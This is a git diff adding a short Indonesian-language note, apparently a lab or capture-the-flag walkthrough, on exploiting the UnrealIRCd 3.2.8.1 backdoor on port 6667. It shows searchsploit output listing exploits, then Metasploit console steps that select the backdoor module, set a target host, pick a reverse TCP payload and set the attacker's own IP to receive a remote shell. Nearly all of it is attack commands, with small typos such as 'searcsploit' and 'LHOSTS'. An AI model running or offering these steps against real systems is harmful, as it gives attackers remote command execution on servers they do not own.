@@ -1,0 +1,25 @@
+### exploit UnrealIRCd/irc,ini berjalan pada port 6667
+
+# kita cari dulu dengan searchsploit
+$ searcsploit unrealircd
+
+------------------------------------------------------------------------------------------------------------------------- -----------------------------
+ Exploit Title                                                                                                           |  Path
+------------------------------------------------------------------------------------------------------------------------- -----------------------------
+UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                             | linux/remote/16922.rb
+UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                                  | windows/dos/18011.txt
+UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                           | linux/remote/13853.pl
+UnrealIRCd 3.x - Remote Denial of Service                                                                                | windows/dos/27407.pl
+------------------------------------------------------------------------------------------------------------------------- -----------------------------
+
+# kita akan menggunaan yang pertama yang ada di metasploit
+
+$ msfconsole
+msf6 > search unrealircd
+msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS <ip target>
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payload
+# kita gunakan payload reverse/tcp
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) >  payload <nomer payload>
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOSTS <ip kita>
